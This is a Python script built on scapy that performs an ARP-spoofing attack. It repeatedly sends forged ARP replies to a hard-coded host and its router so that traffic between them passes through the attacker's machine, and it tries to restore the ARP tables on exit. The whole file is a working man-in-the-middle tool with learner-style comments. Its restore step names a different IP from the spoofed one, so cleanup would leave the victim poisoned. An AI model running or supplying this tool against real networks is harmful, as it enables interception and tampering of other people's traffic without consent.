import scapy.all as scapy
import time

 
def getMac(ip):
    arpPacket = scapy.ARP(pdst=ip)#create an arp packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#where to send the packet
    arp_request_broadcast = broadcast/arpPacket #making the arp packet
    answeredList = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #sending the packet, 
    #timeout is for waiting and exiting the function or else it will be stuck in a loop
    #verbose is set to false so the output will be a little clean
    return answeredList[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    #creating an arp packet 
    #psdt=target ip address
    #hwds=target mac address
    #psrc=source ip address meaning where is this packet coming from. WE are gonna set this to router ip.
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = getMac(destination_ip)
    source_mac = getMac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    #op=2 is for response
    #pdst=destination ip address
    #hwdst=destination mac address
    #psrc=source ip address
    #hwsrc=source mac address
    scapy.send(packet, count=4, verbose=False)

send_packets_count = 0
try: # handling the error of control c
    while True:
        spoof("192.168.1.132", "192.168.1.1")
        spoof("192.168.1.1","192.168.1.132")
        send_packets_count = send_packets_count + 2
        print("\r[+] Sent packets " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please Wait.\n")
    restore("192.168.1.10", "192.168.1.1")
    print("[+] ARP Table restored. Quitting...")
    

